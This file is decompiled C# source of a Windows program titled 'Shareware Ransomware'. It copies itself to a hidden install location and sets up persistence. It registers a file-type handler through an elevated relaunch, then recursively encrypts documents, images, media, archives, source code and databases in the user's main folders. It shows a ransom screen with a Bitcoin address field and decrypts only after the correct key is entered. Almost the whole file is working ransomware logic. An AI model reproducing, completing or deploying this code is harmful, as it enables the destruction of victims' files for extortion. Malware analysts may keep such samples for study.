using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Shareware.Core;
using Shareware.My;
using Shareware.Shareware.core;

namespace Shareware;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	public UFuncs UFuncsEx;

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Panel Panel2
	{
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Panel Panel3
	{
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox5
	{
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_06c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ca: Expected O, but got Unknown
		//IL_09a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b2: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Panel2 = new Panel();
		Panel3 = new Panel();
		TextBox4 = new TextBox();
		Label3 = new Label();
		TextBox3 = new TextBox();
		Label4 = new Label();
		TextBox2 = new TextBox();
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		TextBox5 = new TextBox();
		Label2 = new Label();
		Button1 = new Button();
		ProgressBar1 = new ProgressBar();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((TextBoxBase)TextBox1).set_BackColor(Color.FromArgb(64, 64, 64));
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)0);
		((Control)TextBox1).set_Font(new Font("Consolas", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(Color.White);
		((TextBoxBase)TextBox1).set_HideSelection(false);
		TextBox textBox = TextBox1;
		Point location = new Point(320, 52);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox textBox2 = TextBox1;
		Size size = new Size(408, 272);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		((Control)TextBox1).set_TabStop(false);
		TextBox1.set_Text(componentResourceManager.GetString("TextBox1.Text"));
		TextBox1.set_TextAlign((HorizontalAlignment)2);
		((TextBoxBase)TextBox1).set_WordWrap(false);
		((Control)Panel2).set_BackColor(Color.FromArgb(64, 64, 64));
		((Control)Panel2).get_Controls().Add((Control)(object)Button1);
		((Control)Panel2).get_Controls().Add((Control)(object)TextBox5);
		((Control)Panel2).get_Controls().Add((Control)(object)Label2);
		((Control)Panel2).set_Dock((DockStyle)2);
		Panel panel = Panel2;
		location = new Point(0, 249);
		((Control)panel).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel2 = Panel2;
		size = new Size(740, 87);
		((Control)panel2).set_Size(size);
		((Control)Panel2).set_TabIndex(2);
		((Control)Panel3).set_BackColor(Color.FromArgb(64, 64, 64));
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox4);
		((Control)Panel3).get_Controls().Add((Control)(object)Label3);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox3);
		((Control)Panel3).get_Controls().Add((Control)(object)Label4);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel3).get_Controls().Add((Control)(object)Label1);
		((Control)Panel3).set_Dock((DockStyle)1);
		Panel panel3 = Panel3;
		location = new Point(0, 0);
		((Control)panel3).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel4 = Panel3;
		size = new Size(740, 87);
		((Control)panel4).set_Size(size);
		((Control)Panel3).set_TabIndex(3);
		((TextBoxBase)TextBox4).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox4).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox4).set_ForeColor(Color.FromArgb(128, 255, 128));
		TextBox textBox3 = TextBox4;
		location = new Point(482, 10);
		((Control)textBox3).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		((TextBoxBase)TextBox4).set_ReadOnly(true);
		TextBox textBox4 = TextBox4;
		size = new Size(246, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox4).set_TabIndex(5);
		TextBox4.set_Text("0000-00000000000-000000000-0000");
		Label3.set_AutoSize(true);
		((Control)Label3).set_ForeColor(Color.White);
		Label label = Label3;
		location = new Point(396, 12);
		((Control)label).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label2 = Label3;
		size = new Size(80, 13);
		((Control)label2).set_Size(size);
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Bitcoin Adress :");
		((TextBoxBase)TextBox3).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox3).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox3).set_ForeColor(Color.FromArgb(255, 128, 128));
		TextBox textBox5 = TextBox3;
		location = new Point(67, 49);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		((TextBoxBase)TextBox3).set_ReadOnly(true);
		TextBox textBox6 = TextBox3;
		size = new Size(125, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(3);
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		Label label3 = Label4;
		location = new Point(29, 51);
		((Control)label3).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label4 = Label4;
		size = new Size(32, 13);
		((Control)label4).set_Size(size);
		((Control)Label4).set_TabIndex(2);
		Label4.set_Text("File : ");
		((TextBoxBase)TextBox2).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox2).set_ForeColor(Color.FromArgb(255, 255, 128));
		TextBox textBox7 = TextBox2;
		location = new Point(67, 12);
		((Control)textBox7).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		((TextBoxBase)TextBox2).set_ReadOnly(true);
		TextBox textBox8 = TextBox2;
		size = new Size(302, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		Label label5 = Label1;
		location = new Point(12, 14);
		((Control)label5).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label6 = Label1;
		size = new Size(49, 13);
		((Control)label6).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("UserID : ");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		location = new Point(15, 93);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(148, 150);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(4);
		PictureBox1.set_TabStop(false);
		((TextBoxBase)TextBox5).set_BackColor(Color.Gray);
		((TextBoxBase)TextBox5).set_BorderStyle((BorderStyle)1);
		((TextBoxBase)TextBox5).set_ForeColor(Color.FromArgb(255, 255, 128));
		TextBox textBox9 = TextBox5;
		location = new Point(52, 17);
		((Control)textBox9).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox10 = TextBox5;
		size = new Size(271, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox5).set_TabIndex(3);
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		Label label7 = Label2;
		location = new Point(12, 19);
		((Control)label7).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label8 = Label2;
		size = new Size(34, 13);
		((Control)label8).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Key : ");
		Button button = Button1;
		location = new Point(226, 43);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(97, 29);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Uninstall");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(15, 154);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(713, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(5);
		((Control)ProgressBar1).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(28, 106, 148));
		size = new Size(740, 336);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Shareware Ransomware");
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		UFuncsEx = new UFuncs();
		InitializeComponent();
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Conversions.ToString(LogFuncs.LogFile)))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(LogFuncs.LogFile));
		}
		try
		{
			Application.add_ThreadException((ThreadExceptionEventHandler)Application_Exception_Handler);
			Application.SetUnhandledExceptionMode((UnhandledExceptionMode)2, false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Application_Exception_Handler(object sender, ThreadExceptionEventArgs e)
	{
		Exception exception = e.Exception;
		LogFuncs.WriteLog(exception.Message, LogFuncs.InfoType.Exception);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (File.Exists(DirPaths.InstallDir))
		{
			ArgumentProc();
		}
		else
		{
			Install();
		}
	}

	private void ArgumentProc()
	{
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs.Length == 2)
		{
			LogFuncs.WriteLog("Argument : " + commandLineArgs[1], LogFuncs.InfoType.None);
		}
		switch (Strings.LCase(commandLineArgs[1]))
		{
		case "-silent":
			SilentA();
			return;
		case "-install":
			Install();
			return;
		case "-regedit":
			AddRegedit();
			return;
		case "-uninstall":
			SilentB();
			return;
		}
		TextBox2.set_Text(DirPaths.strPass);
		TextBox3.set_Text(Path.GetFileNameWithoutExtension(commandLineArgs[0]));
		((Control)this).Show();
		((Form)this).set_Opacity(1.1);
	}

	private void Install()
	{
		if (!File.Exists(DirPaths.InstallDir))
		{
			File.Copy(Application.get_ExecutablePath(), DirPaths.InstallDir);
			UFuncs.FileHide(DirPaths.InstallDir);
		}
		new PerSys();
		if (Registry.ClassesRoot.OpenSubKey(DirPaths.ExtensionDefaul) == null)
		{
			UFuncs.OpenAsAdmin(DirPaths.InstallDir, "-regedit");
		}
		else
		{
			SilentA();
		}
	}

	private void StartAsAdmin()
	{
		UFuncs.OpenAsAdmin(DirPaths.InstallDir, "-uninstall");
	}

	private void AddRegedit()
	{
		((Control)this).Hide();
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(DirPaths.ExtensionDefaul)
			.SetValue("", "Shareware File", RegistryValueKind.String);
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey("Shareware File\\shell\\open\\command")
			.SetValue("", DirPaths.InstallDir + " \"%l\" ", RegistryValueKind.String);
		SilentA();
	}

	private void SilentA()
	{
		((Control)this).Hide();
		Thread thread = new Thread(StartAnalisys);
		thread.Start();
	}

	private void StartAnalisys()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo current = default(FileInfo);
		string[] array = default(string[]);
		string[] fileExtPatterns = default(string[]);
		string[] array2 = default(string[]);
		int num5 = default(int);
		string dirPath = default(string);
		IEnumerable<FileInfo> files = default(IEnumerable<FileInfo>);
		IEnumerator<FileInfo> enumerator = default(IEnumerator<FileInfo>);
		ShareHook shareHook = default(ShareHook);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1063:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0043;
						case 4:
							goto IL_02e7;
						case 5:
							goto IL_0301;
						case 6:
							goto IL_0322;
						case 7:
							goto IL_033f;
						case 8:
							goto IL_0349;
						case 9:
							goto IL_035c;
						case 10:
							goto IL_0364;
						case 12:
							goto IL_0387;
						case 13:
							goto IL_038b;
						case 16:
							goto IL_03ba;
						case 11:
						case 14:
						case 15:
							goto IL_03c3;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_038b:
					num = 13;
					LogFuncs.WriteLog("File Processing Failed: " + current.FullName, LogFuncs.InfoType.Critical);
					goto IL_03c3;
					IL_0008:
					num = 2;
					array = new string[5]
					{
						DirPaths.Desktop,
						DirPaths.Document,
						DirPaths.Pictures,
						DirPaths.Music,
						DirPaths.ProgramFiles
					};
					goto IL_0043;
					IL_0043:
					num = 3;
					fileExtPatterns = new string[67]
					{
						"*.aif", "*.cda", "*.mid", "*.mp3", "*.mpa", "*.ogg", "*.wav", "*.wma", "*.wpl", "*.7z",
						"*.arj", "*.pkg", "*.rar", "*.rpm", "*.zip", "*.tar.gz", "*.rar", "*.dat", "*.csv", "*.db",
						"*.dbf", "*.sql", "*.jar", "*.py", "*.exe", "*.bmp", "*.gif", "*.ico", "*.jpeg", "*.jpg",
						"*.png", "*.key", "*.odp", "*.pps", "*.ppt", "*.pptx", "*.c", "*.cpp", "*.h", "*.cs",
						"*.java", "*.class", "*.swift", "*.ods", "*.xls", "*.xlsm", "*.xlsx", "*.3g2", "*.3gp", "*.avi",
						"*.flv", "*.h264", "*.m4v", "*.mkv", "*.mov", "*.mp4", "*.mpg", "*.wmv", "*.mpeg", "*.doc",
						"*.docx", "*.odt", "*.pdf", "*.rtf", "*.tex", "*.txt", "*.wpd"
					};
					goto IL_02e7;
					IL_02e7:
					num = 4;
					array2 = array;
					num5 = 0;
					goto IL_02f0;
					IL_02f0:
					if (num5 < array2.Length)
					{
						dirPath = array2[num5];
						goto IL_0301;
					}
					goto end_IL_0000_2;
					IL_03c3:
					num = 15;
					goto IL_032d;
					IL_0301:
					num = 5;
					files = FileDirSearcher.GetFiles(dirPath, SearchOption.AllDirectories, new string[1] { "*" }, fileExtPatterns, ignoreCase: true, throwOnError: true);
					goto IL_0322;
					IL_0322:
					num = 6;
					enumerator = files.GetEnumerator();
					goto IL_032d;
					IL_032d:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_033f;
					}
					enumerator?.Dispose();
					num5 = checked(num5 + 1);
					goto IL_03ba;
					IL_03ba:
					num = 16;
					goto IL_02f0;
					IL_033f:
					num = 7;
					shareHook = new ShareHook();
					goto IL_0349;
					IL_0349:
					num = 8;
					flag = shareHook.Encriptor(current.FullName);
					goto IL_035c;
					IL_035c:
					num = 9;
					if (flag)
					{
						goto IL_0364;
					}
					goto IL_0387;
					IL_0364:
					num = 10;
					LogFuncs.WriteLog("File: " + current.FullName + " Successfully Processed!", LogFuncs.InfoType.Information);
					goto IL_03c3;
					IL_0387:
					num = 12;
					goto IL_038b;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1063;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void SilentB()
	{
		((Control)this).Show();
		((Form)this).set_Opacity(1.1);
		((Control)PictureBox1).set_Visible(false);
		((Control)TextBox1).set_Visible(false);
		((Control)TextBox2).set_Visible(false);
		((Control)TextBox3).set_Visible(false);
		((Control)TextBox4).set_Visible(false);
		((Control)Label1).set_Visible(false);
		((Control)Label3).set_Visible(false);
		((Control)Label4).set_Visible(false);
		((Control)ProgressBar1).set_Visible(true);
		Thread thread = new Thread(StartAnalisysB);
		thread.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void StartAnalisysB()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo current = default(FileInfo);
		string[] array = default(string[]);
		string text = default(string);
		string[] fileExtPatterns = default(string[]);
		string[] array2 = default(string[]);
		int num5 = default(int);
		_Closure_0024__1 closure_0024__ = default(_Closure_0024__1);
		string dirPath = default(string);
		IEnumerable<FileInfo> files = default(IEnumerable<FileInfo>);
		IEnumerator<FileInfo> enumerator = default(IEnumerator<FileInfo>);
		ShareHook shareHook = default(ShareHook);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 564:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0043;
							case 4:
								goto IL_0056;
							case 5:
								goto IL_0069;
							case 6:
								goto IL_0092;
							case 7:
								goto IL_00b5;
							case 8:
								goto IL_00c5;
							case 9:
								goto IL_00d5;
							case 10:
								goto IL_00f7;
							case 11:
								goto IL_0109;
							case 12:
								goto IL_0114;
							case 13:
							case 17:
								goto IL_0128;
							case 18:
								goto IL_0140;
							case 19:
								goto IL_0148;
							case 21:
								goto IL_016b;
							case 22:
								goto IL_016f;
							case 25:
								goto IL_019e;
							case 20:
							case 23:
							case 24:
								goto IL_01a7;
							default:
								goto end_IL_0000;
							case 26:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_016f:
						num = 22;
						LogFuncs.WriteLog("File Processing Failed: " + current.FullName, LogFuncs.InfoType.Critical);
						goto IL_01a7;
						IL_0008:
						num = 2;
						array = new string[5]
						{
							DirPaths.Desktop,
							DirPaths.Document,
							DirPaths.Pictures,
							DirPaths.Music,
							DirPaths.ProgramFiles
						};
						goto IL_0043;
						IL_0043:
						num = 3;
						text = "*" + DirPaths.ExtensionDefaul;
						goto IL_0056;
						IL_0056:
						num = 4;
						fileExtPatterns = new string[1] { text };
						goto IL_0069;
						IL_0069:
						num = 5;
						array2 = array;
						num5 = 0;
						goto IL_0072;
						IL_0072:
						if (num5 < array2.Length)
						{
							closure_0024__ = new _Closure_0024__1(closure_0024__);
							dirPath = array2[num5];
							closure_0024__._0024VB_0024Me = this;
							goto IL_0092;
						}
						ProjectData.EndApp();
						goto end_IL_0000_2;
						IL_01a7:
						num = 24;
						goto IL_00e2;
						IL_0092:
						num = 6;
						files = FileDirSearcher.GetFiles(dirPath, SearchOption.AllDirectories, new string[1] { "*" }, fileExtPatterns, ignoreCase: true, throwOnError: true);
						goto IL_00b5;
						IL_00b5:
						num = 7;
						closure_0024__._0024VB_0024Local_LocalVariable = files.Count();
						goto IL_00c5;
						IL_00c5:
						num = 8;
						closure_0024__._0024VB_0024Local_Maximun = files.Count();
						goto IL_00d5;
						IL_00d5:
						num = 9;
						enumerator = files.GetEnumerator();
						goto IL_00e2;
						IL_00e2:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_00f7;
						}
						enumerator?.Dispose();
						num5++;
						goto IL_019e;
						IL_019e:
						num = 25;
						goto IL_0072;
						IL_00f7:
						num = 10;
						closure_0024__._0024VB_0024Local_LocalVariable--;
						goto IL_0109;
						IL_0109:
						num = 11;
						shareHook = new ShareHook();
						goto IL_0114;
						IL_0114:
						num = 12;
						flag = shareHook.Decriptor(current.FullName);
						goto IL_0128;
						IL_0128:
						num = 17;
						((Control)this).BeginInvoke((Delegate)new VB_0024AnonymousDelegate_0(closure_0024__._Lambda_0024__1));
						goto IL_0140;
						IL_0140:
						num = 18;
						if (flag)
						{
							goto IL_0148;
						}
						goto IL_016b;
						IL_0148:
						num = 19;
						LogFuncs.WriteLog("File: " + current.FullName + " Successfully Processed!", LogFuncs.InfoType.Information);
						goto IL_01a7;
						IL_016b:
						num = 21;
						goto IL_016f;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 564;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox5.get_Text(), "", false) != 0 && Operators.CompareString(TextBox5.get_Text(), UFuncsEx.EncodeBase64(DirPaths.strPass), false) == 0)
		{
			StartAsAdmin();
		}
	}
}
